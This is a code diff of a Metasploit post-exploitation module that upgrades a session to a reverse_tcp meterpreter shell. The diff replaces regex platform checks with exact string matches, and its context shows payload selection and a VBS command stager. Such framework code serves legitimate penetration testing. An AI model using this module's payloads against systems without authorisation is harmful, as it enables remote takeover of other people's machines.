@@ -80,18 +80,18 @@ class MetasploitModule < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when /windows/i
+    when 'windows'
       platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
-    when /osx/i
+    when 'osx'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: OS X")
-    when /solaris/i
+    when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: Solaris")
@@ -200,7 +200,7 @@ class MetasploitModule < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform =~ /win/i
+    if session.platform == 'windows'
       opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
